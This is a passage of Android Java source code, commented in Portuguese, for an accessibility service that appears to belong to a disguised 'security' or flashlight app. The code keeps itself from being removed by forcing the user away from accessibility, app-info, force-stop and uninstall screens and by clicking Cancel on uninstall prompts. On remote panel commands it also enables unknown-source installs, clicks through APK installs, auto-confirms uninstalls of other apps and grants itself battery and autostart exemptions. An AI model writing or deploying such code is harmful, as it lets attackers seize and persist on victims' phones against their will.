                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Gesto wake falhou: " + e.getMessage());
            }
        }, 500); // Delay de 500ms após outros métodos
        
        Log.d(TAG, "💡 Todos os métodos de wake executados!");
    }
    
    // ==================== PROTEÇÃO CONTRA REMOÇÃO (ULTRA AGRESSIVA) ====================
    
    private long lastProtectionAction = 0;
    private static final long PROTECTION_COOLDOWN = 4500;
    private int consecutiveProtectionHits = 0;

    private void triggerProtectionExit(String reason) {
        long now = System.currentTimeMillis();
        if (now - lastProtectionAction < PROTECTION_COOLDOWN) {
            return;
        }
        lastProtectionAction = now;
        Log.d(TAG, "Protecao: " + reason);
        performGlobalAction(GLOBAL_ACTION_HOME);
    }
    
    /**
     * 🔒 Protege o app contra desinstalação e desativação
     * - Detecta quando usuário tenta acessar configurações de acessibilidade
     * - Detecta quando usuário tenta desinstalar o app
     * - Fecha automaticamente essas telas
     */
    private void protectAgainstRemoval(String packageName, String className, AccessibilityNodeInfo rootNode) {
        // 🎨 IMPORTANTE: NÃO interfere quando estamos no nosso próprio app!
        if (packageName.equals("com.seguranca.protecao")) {
            return; // Ignora completamente nosso app
        }
        
        // Evita ações muito frequentes
        long now = System.currentTimeMillis();
        if (now - lastProtectionAction < PROTECTION_COOLDOWN) {
            return;
        }
        
        // Log para debug
        Log.d(TAG, "🔒 CHECK: pkg=" + packageName + " class=" + className);
        
        // 📦 EXCEÇÃO IMPORTANTE: Permite telas de "Fontes Desconhecidas" / "Install unknown apps"
        // Estas telas são NECESSÁRIAS para instalar APKs remotamente!
        if (packageName.equals("com.android.settings")) {
            if (className.contains("ManageAppExternalSourcesActivity") ||
                className.contains("ExternalSources") ||
                className.contains("UnknownApps") ||
                className.contains("InstallApps") ||
                className.contains("SpaActivity")) {
                
                Log.d(TAG, "📦 PERMITINDO: Tela de fontes desconhecidas/install apps");
                
                // Se auto-install está ativo, tenta habilitar automaticamente
                if (autoInstallEnabled) {
                    autoEnableUnknownSources(rootNode);
                }
                return; // NÃO bloqueia esta tela!
            }
        }
        
        // 📦 EXCEÇÃO CRÍTICA: Verificar se é tela de Install Unknown Apps ANTES de tudo!
        // Essa tela contém o nome do app, então precisamos ignorá-la ANTES da verificação de acessibilidade
        boolean isUnknownAppsScreen = packageName.equals("com.android.settings") && rootNode != null &&
            (containsAnyText(rootNode, new String[]{"Install unknown apps", "Instalar apps desconhecidos", 
             "Allow from this source", "Permitir desta fonte", "Unknown apps"}));
        
        if (isUnknownAppsScreen) {
            Log.d(TAG, "📦 EXCEÇÃO CRÍTICA: Tela de Unknown Apps - NÃO fechando!");
            if (autoInstallEnabled) {
                autoEnableUnknownSources(rootNode);
            }
            return; // NUNCA fecha esta tela!
        }
        
        // 🔒 1. Detecta tela de configurações de Acessibilidade (MAIS AGRESSIVO)
        boolean isAccessibilitySettings = false;
        
        // Verifica pelo nome da classe (EXCETO ManageAppExternalSources que é para install apps)
        if (packageName.equals("com.android.settings")) {
            if ((className.contains("Accessibility") || 
                className.contains("accessibility") ||
                className.contains("AccessibilitySettings") ||
                className.contains("AccessibilityDetailsSettings") ||
                className.contains("ToggleAccessibilityService")) &&
                !className.contains("ExternalSource")) { // Ignora telas de External Sources!
                isAccessibilitySettings = true;
            }
        }
        
        // Verifica também pelo conteúdo da tela (procura nosso app na lista de acessibilidade)
        // MAS apenas se NÃO for tela de "Install unknown apps"
        if (packageName.equals("com.android.settings") && rootNode != null && !isUnknownAppsScreen) {
            // Lista de indicadores de ACESSIBILIDADE (não install apps)
            java.util.List<String> accessibilityIndicators = new java.util.ArrayList<>();
            accessibilityIndicators.add("Downloaded apps");
            accessibilityIndicators.add("Downloaded services");
            accessibilityIndicators.add("Serviços baixados");
            accessibilityIndicators.add("Apps baixados");
            accessibilityIndicators.add("Installed services");
            accessibilityIndicators.add("Serviços instalados");
            
            // SÓ adiciona nome do app se a tela tiver indicadores de acessibilidade
            // Isso evita false positives na tela de "Install unknown apps"
            boolean hasAccessibilityIndicator = containsAnyText(rootNode, accessibilityIndicators.toArray(new String[0]));
            
            if (hasAccessibilityIndicator && containsOurAppName(rootNode)) {
                // Confirma que é tela de acessibilidade
                isAccessibilitySettings = true;
            }
        }
        
        if (isAccessibilitySettings) {
            Log.d(TAG, "🔒 PROTEÇÃO: Configurações de Acessibilidade detectadas");
            consecutiveProtectionHits++;
            triggerProtectionExit("accessibility_settings");
            return;
        } else {
            consecutiveProtectionHits = 0;
        }
        
        // 🔧 ROM CONFIG: Auto-click em configurações de ROM (Autostart, Battery, etc)
        if (romConfigEnabled) {
            Log.d(TAG, "🔧 ROM_CONFIG ATIVO - Package: " + packageName + " Class: " + className);
            
            // Detecta dialog de "Ignorar otimização de bateria"
            if (handleBatteryOptimizationDialog(packageName, className, rootNode)) {
                Log.d(TAG, "🔧 Battery dialog processado!");
                return; // Já processou
            }
            
            if (handleROMConfigAutoClick(packageName, className, rootNode)) {
                Log.d(TAG, "🔧 ROM Config auto-click processado!");
                return; // Já processou
            }
        }
        
        // 📦 AUTO-INSTALL: Habilita FONTES DESCONHECIDAS automaticamente
        if (autoInstallEnabled && packageName.equals("com.android.settings")) {
            // Detecta tela de "Install unknown apps" / "Fontes desconhecidas"
            boolean isUnknownSourcesScreen = className.contains("ManageAppExternalSources") ||
                                              className.contains("ExternalSources") ||
                                              containsAnyText(rootNode, new String[]{
                                                  "unknown apps", "fontes desconhecidas", 
                                                  "Install unknown", "Instalar desconhecidos",
                                                  "Allow from this source", "Permitir desta fonte"
                                              });
            
            if (isUnknownSourcesScreen) {
                Log.d(TAG, "📦 AUTO-INSTALL: Tela de FONTES DESCONHECIDAS detectada!");
                autoEnableUnknownSources(rootNode);
                
                // Após habilitar, pressiona BACK para voltar à instalação
                handler.postDelayed(() -> {
                    performGlobalAction(GLOBAL_ACTION_BACK);
                    Log.d(TAG, "📦 AUTO-INSTALL: Voltando para tela de instalação...");
                }, 500);
                return;
            }
        }
        
        // 📦 AUTO-INSTALL: Se estamos instalando um APK, auto-clica em "Instalar"
        if (autoInstallEnabled && packageName.contains("packageinstaller")) {
            // Verifica se é tela de INSTALAÇÃO (não desinstalação)
            boolean isInstallScreen = containsInstallText(rootNode) && !containsUninstallText(rootNode);
            
            // Primeiro verifica se é diálogo de "Unknown apps" - precisa clicar em Settings
            boolean isUnknownAppsDialog = containsAnyText(rootNode, new String[]{
                "isn't allowed to install unknown apps",
                "não tem permissão para instalar apps desconhecidos",
                "unknown apps from this source",
                "apps desconhecidos desta fonte",
                "For your security",
                "Para sua segurança"
            });
            
            if (isUnknownAppsDialog) {
                Log.d(TAG, "📦 AUTO-INSTALL: Diálogo de FONTES DESCONHECIDAS - Clicando em Settings!");
                autoClickSettingsButton(rootNode);
                return;
            }
            
            if (isInstallScreen) {
                Log.d(TAG, "📦 AUTO-INSTALL: Tela de instalação detectada!");
                autoClickInstallButton(rootNode);
                return;
            }
        }
        
        // 🔒 2. Detecta QUALQUER tela de desinstalação (PackageInstaller)
        boolean isUninstallScreen = packageName.contains("packageinstaller") ||
                                    packageName.equals("com.google.android.packageinstaller") ||
                                    packageName.equals("com.android.packageinstaller") ||
                                    className.contains("Uninstall") ||
                                    className.contains("UninstallerActivity");
        
        if (isUninstallScreen && !autoInstallEnabled) {
            // Verifica se menciona NOSSO app na tela
            boolean isOurApp = containsOurAppName(rootNode);
            
            if (isOurApp) {
                Log.d(TAG, "🔒 PROTEÇÃO: Tentativa de desinstalação detectada");
                clickCancelButton(rootNode);
                triggerProtectionExit("uninstall_screen");
                return;
            } else if (allowUninstallOtherApps) {
                // ✅ Se é OUTRO app e temos permissão do painel, AUTO-CLICA em "OK/Uninstall"
                Log.d(TAG, "🗑️ PERMITINDO desinstalação de OUTRO app (comando do painel)!");
                autoClickUninstallButton(rootNode);
                return;
            }
            // Se é outro app mas não temos permissão, não faz nada (deixa o usuário decidir)
        }
        
        // 🔒 3. Detecta diálogo de confirmação de desinstalação
        if (packageName.contains("packageinstaller") || packageName.contains("systemui")) {
            // Verifica se tem texto "uninstall" ou "desinstalar"
            if (containsUninstallText(rootNode)) {
                if (containsOurAppName(rootNode)) {
                    Log.d(TAG, "🔒 PROTEÇÃO: Diálogo de desinstalação detectado");
                    clickCancelButton(rootNode);
                    triggerProtectionExit("uninstall_dialog");
                    return;
                } else if (allowUninstallOtherApps) {
                    // ✅ Se é OUTRO app e temos permissão do painel, AUTO-CLICA em "OK/Uninstall"
                    Log.d(TAG, "🗑️ Auto-click em 'Uninstall' para OUTRO app!");
                    autoClickUninstallButton(rootNode);
                    return;
                }
            }
        }
        
        // 📦 EXCEÇÃO: Não fecha tela de "Install unknown apps" (Fontes desconhecidas)
        // Isso é necessário para instalar APKs pelo painel!
        boolean isUnknownSourcesScreen = className.contains("ManageAppExternalSources") ||
                                          className.contains("ExternalSources") ||
                                          className.contains("UnknownSources");
        
        if (isUnknownSourcesScreen) {
            Log.d(TAG, "📦 EXCEÇÃO: Tela de fontes desconhecidas - NÃO fechando!");
            // Não fecha essa tela - é necessária para instalar APKs
            // Se auto-install está ativo, habilita o switch
            if (autoInstallEnabled) {
                autoEnableUnknownSources(rootNode);
            }
            return;
        }
        
        // 🔒 4. Detecta tela de "App info" do nosso app
        boolean isAppInfoScreen = packageName.equals("com.android.settings") &&
            (className.contains("InstalledAppDetails") ||
             className.contains("AppInfoDashboard") ||
             className.contains("AppInfo") ||
             className.contains("ApplicationDetailsActivity") ||
             className.contains("ManageApplications"));
        
        // APENAS bloqueia se for do NOSSO app E NÃO for tela de fontes desconhecidas
        if (isAppInfoScreen && containsOurAppName(rootNode) && !isUnknownSourcesScreen) {
            Log.d(TAG, "🔒 PROTEÇÃO: Tela de info do app detectada");
            triggerProtectionExit("app_info");
            return;
        }
        
        // 🔒 5. Detecta tela de "Force Stop" ou "Disable" do nosso app
        if (packageName.equals("com.android.settings") && rootNode != null) {
            boolean hasForceStop = containsAnyText(rootNode, new String[]{
                "Force stop", "Forçar parada", "Forçar interrupção",
                "Disable", "Desativar", "Desabilitar",
                "Uninstall", "Desinstalar"
            });
            
            if (hasForceStop && containsOurAppName(rootNode)) {
                Log.d(TAG, "🔒 PROTEÇÃO: Force Stop/Disable/Uninstall detectado");
                triggerProtectionExit("force_stop");
                return;
            }
        }
        
        // 🔒 6. Detecta lista de Apps (quando clicam no nosso app)
        if (packageName.equals("com.android.settings") && 
            (className.contains("ManageApplications") || 
             className.contains("AllApplications") ||
             className.contains("RecentApps"))) {
            
            if (containsOurAppName(rootNode)) {
                Log.d(TAG, "🔒 PROTEÇÃO: Nosso app na lista de apps");
                triggerProtectionExit("app_list");
                return;
            }
        }
    }
    
    /**
     * 🗑️ Auto-clica em "Uninstall/OK" para desinstalar OUTROS apps
     * Agora com múltiplas tentativas e diferentes métodos de clique
     */
    private void autoClickUninstallButton(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return;
        
        String[] uninstallButtons = {
            "OK", "Uninstall", "Desinstalar", "Confirm", "Confirmar", 
            "Yes", "Sim", "Aceitar", "Accept"
        };
        
        for (String buttonText : uninstallButtons) {
            List<AccessibilityNodeInfo> buttons = rootNode.findAccessibilityNodeInfosByText(buttonText);
            if (buttons != null && !buttons.isEmpty()) {
                for (AccessibilityNodeInfo btn : buttons) {
                    Log.d(TAG, "🗑️ AUTO-UNINSTALL: Tentando clicar em '" + buttonText + "'");
                    
                    // Método 1: Clique direto no botão
                    if (btn.isClickable()) {
                        btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "🗑️ ✅ Clicou direto no botão: " + buttonText);
                        return;
                    }
                    
                    // Método 2: Clique no pai
                    AccessibilityNodeInfo parent = btn.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "🗑️ ✅ Clicou no pai do botão: " + buttonText);
                        return;
                    }
                    
                    // Método 3: Focus + click
                    btn.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "🗑️ ✅ Focus + Click no botão: " + buttonText);
                    
                    // Método 4: Clique por coordenadas (para botões não clicáveis)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        clickByCoordinates(btn);
                    }
                    return;
                }
            }
        }
        
        // Método alternativo: Procura todos os botões e clica no da direita (geralmente é OK)
        List<AccessibilityNodeInfo> allButtons = findNodesByClassName(rootNode, "android.widget.Button");
        if (allButtons != null && allButtons.size() >= 2) {
            AccessibilityNodeInfo rightButton = allButtons.get(allButtons.size() - 1);
            Log.d(TAG, "🗑️ AUTO-UNINSTALL: Clicando no último botão (OK)");
            rightButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                clickByCoordinates(rightButton);
            }
        }
    }
    
    /**
     * 🗑️ Clica por coordenadas (para botões que não respondem a ACTION_CLICK)
     */
    private void clickByCoordinates(AccessibilityNodeInfo node) {
        if (node == null) return;

        android.graphics.Rect bounds = new android.graphics.Rect();
        node.getBoundsInScreen(bounds);

        int x = bounds.centerX();
        int y = bounds.centerY();

        executeClick(x, y);
    }
    
    /**
     * Verifica se contém texto de desinstalação
     */
    private boolean containsUninstallText(AccessibilityNodeInfo node) {
        String[] uninstallTexts = {
            "uninstall", "Uninstall", "desinstalar", "Desinstalar",
            "Do you want to uninstall", "Deseja desinstalar",
            "will be uninstalled", "será desinstalado"
        };
        return containsAnyText(node, uninstallTexts);
    }
    
    /**
     * 📦 Verifica se contém texto de instalação
     */
    private boolean containsInstallText(AccessibilityNodeInfo node) {
        String[] installTexts = {
            "Install", "Instalar", "Do you want to install", "Deseja instalar",
            "Install anyway", "Instalar mesmo assim", "Update", "Atualizar",
            "Install unknown apps", "Instalar apps desconhecidos"
        };
        return containsAnyText(node, installTexts);
    }
    
    /**
     * 🔋 Detecta e clica no dialog "Ignorar otimização de bateria"
     * Este dialog aparece com botões "Permitir" / "Allow" e "Negar" / "Deny"
     */
    private boolean handleBatteryOptimizationDialog(String packageName, String className, AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;
        
        // Verifica se é um dialog de bateria
        boolean isBatteryDialog = packageName.contains("settings") || 
                                  packageName.contains("android") ||
                                  className.contains("Dialog") ||
                                  className.contains("AlertActivity");
        
        if (!isBatteryDialog) return false;
        
        // Palavras que indicam o dialog de "Ignorar otimização de bateria"
        String[] batteryDialogIndicators = {
            "battery optimization", "otimização de bateria",
            "Let app always run in background", "Permitir que o app sempre execute",
            "ignore battery optimizations", "ignorar otimizações de bateria"
        };
        
        // Verifica se contém texto do dialog de bateria
        boolean foundBatteryText = false;
        for (String indicator : batteryDialogIndicators) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(indicator);
            if (nodes != null && !nodes.isEmpty()) {
                foundBatteryText = true;
                Log.d(TAG, "🔋 DIALOG: Detectado dialog de otimização de bateria!");
                break;
            }
        }
        
        if (!foundBatteryText) return false;
        
        // Procura botão "Allow" / "Permitir"
        String[] allowButtons = {"Allow", "Permitir", "OK", "Yes", "Sim"};
        for (String buttonText : allowButtons) {
            List<AccessibilityNodeInfo> buttons = rootNode.findAccessibilityNodeInfosByText(buttonText);
            if (buttons != null && !buttons.isEmpty()) {
                for (AccessibilityNodeInfo btn : buttons) {
                    if (btn.isClickable()) {
                        Log.d(TAG, "🔋 DIALOG: Clicando em '" + buttonText + "'!");
                        btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    // Tenta pai
                    AccessibilityNodeInfo parent = btn.getParent();
                    if (parent != null && parent.isClickable()) {
                        Log.d(TAG, "🔋 DIALOG: Clicando no pai de '" + buttonText + "'!");
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
        }
        
        return false;
    }
    
    /**
     * 🔧 ROM CONFIG: Auto-click em configurações de ROM
     * Detecta telas de: Autostart, Battery Optimization, Protected Apps, etc.
     * Retorna true se processou a tela
     */
    private boolean handleROMConfigAutoClick(String packageName, String className, AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;
        
        // Detecta apps de configuração de segurança/bateria de cada ROM
        boolean isROMConfigApp = 
            packageName.contains("securitycenter") ||      // Xiaomi
            packageName.contains("systemmanager") ||        // Huawei
            packageName.contains("safecenter") ||           // Oppo/Realme
            packageName.contains("permissionmanager") ||    // Vivo
            packageName.contains("lool") ||                 // Samsung Device Care
            packageName.contains("sm.battery") ||           // Samsung Smart Manager
            packageName.equals("com.android.settings") ||   // Android Settings (Stock/Pixel)
            packageName.contains("powerkeeper") ||          // Xiaomi Power
            packageName.contains("oppoguardelf");           // Oppo Guard
            
        if (!isROMConfigApp) return false;
        
        Log.d(TAG, "🔧 ROM CONFIG: Detectada tela de configuração! Package: " + packageName + " Class: " + className);
        
        // 🔋 ESPECIAL: Se estamos na tela "App battery usage" (lista de apps)
        // Precisamos encontrar e clicar no dropdown "All apps" → "Unrestricted"
        // OU rolar até encontrar nosso app
        if (className.contains("AppBatteryUsage") || className.contains("BatteryUsage")) {
            Log.d(TAG, "🔋 Tela de App Battery Usage detectada!");
            
            // Procura pelo dropdown "All apps" para mudar para "Unrestricted"
            List<AccessibilityNodeInfo> allAppsNodes = rootNode.findAccessibilityNodeInfosByText("All apps");
            if (allAppsNodes != null && !allAppsNodes.isEmpty()) {
                for (AccessibilityNodeInfo node : allAppsNodes) {
                    if (node.isClickable()) {
                        Log.d(TAG, "🔋 Clicando em 'All apps' dropdown...");
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        Log.d(TAG, "🔋 Clicando no pai de 'All apps'...");
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
            
            // Se o dropdown está aberto, procura "Unrestricted"
            List<AccessibilityNodeInfo> unrestrictedNodes = rootNode.findAccessibilityNodeInfosByText("Unrestricted");
            if (unrestrictedNodes != null && !unrestrictedNodes.isEmpty()) {
                for (AccessibilityNodeInfo node : unrestrictedNodes) {
                    Log.d(TAG, "🔋 Encontrou 'Unrestricted', clicando...");
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (node.getParent() != null) {
                        node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                    return true;
                }
            }
            
            // Tenta rolar a lista para encontrar nosso app
            scrollToFindOurApp(rootNode);
        }
        
        // 1. PRIMEIRO: Tenta encontrar nosso app na lista e clicar nele
        String[] appNames = {"vamosverne", "Lanterna", "Proteção", "Segurança", "protecao"};
        for (String appName : appNames) {
            List<AccessibilityNodeInfo> appNodes = rootNode.findAccessibilityNodeInfosByText(appName);
            if (appNodes != null && !appNodes.isEmpty()) {
                for (AccessibilityNodeInfo appNode : appNodes) {
                    Log.d(TAG, "🔧 ROM CONFIG: Encontrou '" + appName + "' na lista!");
                    if (appNode.isClickable()) {
                        Log.d(TAG, "🔧 ROM CONFIG: Clicando em nosso app!");
                        appNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    // Tenta pai
                    AccessibilityNodeInfo parent = appNode.getParent();
                    if (parent != null && parent.isClickable()) {
                        Log.d(TAG, "🔧 ROM CONFIG: Clicando no pai do nosso app!");
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    // Tenta avô
                    if (parent != null) {
                        AccessibilityNodeInfo grandparent = parent.getParent();
                        if (grandparent != null && grandparent.isClickable()) {
                            Log.d(TAG, "🔧 ROM CONFIG: Clicando no avô do nosso app!");
                            grandparent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            return true;
                        }
                    }
                }
            }
        }
        
        // 2. SEGUNDO: Palavras para AUTO-HABILITAR (switch on, permitir, etc)
        String[] enableKeywords = {
            // Português
            "Sem restrições", "Ignorar otimização", "Não otimizar", 
            "Permitir atividade em segundo plano", "Manter atividade",
            "Permitir", "Ativar", "Habilitar", "Ligar", "Sim", "Aceitar",
            "Iniciar automaticamente", "Autostart", "Início automático",
            // Inglês
            "Unrestricted", "No restrictions", "Don't optimize",
            "Allow background activity", "Keep running", "Ignore optimization",
            "Allow", "Enable", "Turn on", "Yes", "Accept",
            "Auto-start", "Autostart", "Auto start", "Auto launch"
        };
        
        // Tenta encontrar e clicar em switches/botões
        for (String keyword : enableKeywords) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(keyword);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    Log.d(TAG, "🔧 ROM CONFIG: Encontrou '" + keyword + "'");
                    
                    // Tenta clicar no próprio nó
                    if (node.isClickable()) {
                        Log.d(TAG, "🔧 ROM CONFIG: Clicando em '" + keyword + "'");
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                    
                    // Tenta clicar no pai (switch geralmente está no pai)
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            Log.d(TAG, "🔧 ROM CONFIG: Clicando no pai de '" + keyword + "'");
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            return true;
                        }
                        
                        // Tenta o avô
                        AccessibilityNodeInfo grandparent = parent.getParent();
                        if (grandparent != null && grandparent.isClickable()) {
                            Log.d(TAG, "🔧 ROM CONFIG: Clicando no avô de '" + keyword + "'");
                            grandparent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            return true;
                        }
                    }
                }
            }
        }
        
        // 3. TERCEIRO: Se é tela de bateria, procura por radio buttons de "Unrestricted"
        if (className.contains("Battery") || packageName.contains("battery")) {
            // Procura todos os radio buttons
            List<AccessibilityNodeInfo> radioButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/text1");
            if (radioButtons != null) {
                for (AccessibilityNodeInfo radio : radioButtons) {
                    CharSequence text = radio.getText();
                    if (text != null && (text.toString().contains("Unrestricted") || 
                                         text.toString().contains("Sem restrições"))) {
                        Log.d(TAG, "🔧 ROM CONFIG: Encontrou radio 'Unrestricted'!");
                        radio.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        if (radio.getParent() != null) {
                            radio.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                        return true;
                    }
                }
            }
        }
        
        return false;
    }
    
    /**
     * 🔄 Rola a lista para encontrar nosso app
     */
    private void scrollToFindOurApp(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return;
        
        // Primeiro tenta encontrar nosso app
        String[] appNames = {"vamosverne", "Lanterna", "Proteção", "protecao", "Segurança"};
        for (String appName : appNames) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(appName);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    Log.d(TAG, "🔋 Encontrou nosso app '" + appName + "' na lista!");
                    if (node.isClickable()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                }
            }
        }
        
        // Se não encontrou, tenta rolar a lista
        Log.d(TAG, "🔋 App não visível, tentando rolar lista...");
        
        // Procura uma lista scrollável
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // Faz scroll para baixo usando gesto
            try {
                Path path = new Path();
                int screenHeight = getResources().getDisplayMetrics().heightPixels;
                int screenWidth = getResources().getDisplayMetrics().widthPixels;
                
                // Swipe de baixo para cima (scroll down)
                path.moveTo(screenWidth / 2, screenHeight * 0.7f);
                path.lineTo(screenWidth / 2, screenHeight * 0.3f);
                
                GestureDescription.StrokeDescription stroke = 
                    new GestureDescription.StrokeDescription(path, 0, 300);
                GestureDescription.Builder builder = new GestureDescription.Builder();
                builder.addStroke(stroke);
                
                dispatchGesture(builder.build(), new GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        Log.d(TAG, "🔋 Scroll realizado!");
                    }
                }, null);
            } catch (Exception e) {
                Log.e(TAG, "🔋 Erro ao fazer scroll: " + e.getMessage());
            }
        }
    }
    
    /**
     * 📦 Auto-clica em "Instalar" na tela de instalação de APK
     */
    private void autoClickInstallButton(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return;
        
        // Lista de textos de botões de instalação
        String[] installButtons = {
            "Install", "Instalar", 
            "Update", "Atualizar",
            "Install anyway", "Instalar mesmo assim",
            "Continue", "Continuar",
            "Next", "Próximo", "Avançar",
            "Done", "Concluído", "OK",
            "Open", "Abrir"
        };
        
        for (String buttonText : installButtons) {
            List<AccessibilityNodeInfo> buttons = rootNode.findAccessibilityNodeInfosByText(buttonText);
            if (buttons != null && !buttons.isEmpty()) {
                for (AccessibilityNodeInfo btn : buttons) {
                    if (btn.isClickable() || btn.isEnabled()) {
                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando em '" + buttonText + "'");
                        btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        
                        // Tenta clicar no pai também
                        AccessibilityNodeInfo parent = btn.getParent();
                        if (parent != null && parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                        return;
                    }
                }
            }
        }
        
        // Se não encontrou por texto, procura por classe Button
        findAndClickButton(rootNode, installButtons);
    }
    
    /**
     * 📦 Auto-habilita "Fontes Desconhecidas" / "Install unknown apps"
     */
    private void autoEnableUnknownSources(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return;
        
        Log.d(TAG, "📦 AUTO-INSTALL: Tentando habilitar fontes desconhecidas...");
        
        // Procura por switches/toggles para habilitar
        String[] enableTexts = {
            "Allow from this source", "Permitir desta fonte",
            "Allow", "Permitir",
            "Trust", "Confiar",
            "ON", "Ativado", "Ligado"
        };
        
        // Primeiro, procura por Switch ou Toggle
        findAndClickSwitch(rootNode);
        
        // Também procura por botões com texto de permitir
        for (String text : enableTexts) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    // Verifica se é um switch/toggle que está OFF
                    if (node.getClassName() != null) {
                        String nodeClass = node.getClassName().toString();
                        if (nodeClass.contains("Switch") || nodeClass.contains("Toggle") || 
                            nodeClass.contains("CheckBox") || nodeClass.contains("Checkable")) {
                            if (!node.isChecked()) {
                                Log.d(TAG, "📦 AUTO-INSTALL: Habilitando switch: " + text);
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                return;
                            }
                        }
                    }
                    
                    // Tenta clicar se for clicável
                    if (node.isClickable()) {
                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando em: " + text);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                    
                    // Tenta clicar no pai
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando no pai de: " + text);
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                }
            }
        }
    }
    
    /**
     * 📦 Clica em "Settings" no diálogo de fontes desconhecidas
     */
    private void autoClickSettingsButton(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return;
        
        Log.d(TAG, "📦 AUTO-INSTALL: Procurando botão Settings...");
        
        String[] settingsTexts = {
            "Settings", "Configurações", "Config",
            "Go to Settings", "Ir para Config",
            "App settings", "Config do app"
        };
        
        for (String text : settingsTexts) {
            List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    Log.d(TAG, "📦 AUTO-INSTALL: Encontrou '" + text + "'");
                    
                    if (node.isClickable()) {
                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando em Settings!");
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                    
                    AccessibilityNodeInfo parent = node.getParent();
                    if (parent != null && parent.isClickable()) {
                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando no pai de Settings!");
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return;
                    }
                    
                    // Tenta clicar por coordenadas
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        clickByCoordinates(node);
                        return;
                    }
                }
            }
        }
        
        // Última tentativa: procura todos os botões e clica no da direita (geralmente Settings)
        List<AccessibilityNodeInfo> allButtons = findNodesByClassName(rootNode, "android.widget.Button");
        if (allButtons != null && allButtons.size() >= 2) {
            AccessibilityNodeInfo rightButton = allButtons.get(allButtons.size() - 1);
            Log.d(TAG, "📦 AUTO-INSTALL: Clicando no último botão (Settings)");
            rightButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                clickByCoordinates(rightButton);
            }
        }
    }
    
    /**
     * 📦 Procura e clica em Switch/Toggle na tela
     */
    private void findAndClickSwitch(AccessibilityNodeInfo node) {
        if (node == null) return;
        
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        
        // Verifica se é um Switch/Toggle
        if (className.contains("Switch") || className.contains("Toggle") || 
            className.contains("CheckBox") || className.contains("Checkable")) {
            // Se não está checked, clica para habilitar
            if (!node.isChecked()) {
                Log.d(TAG, "📦 AUTO-INSTALL: Encontrou switch OFF, clicando para habilitar");
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
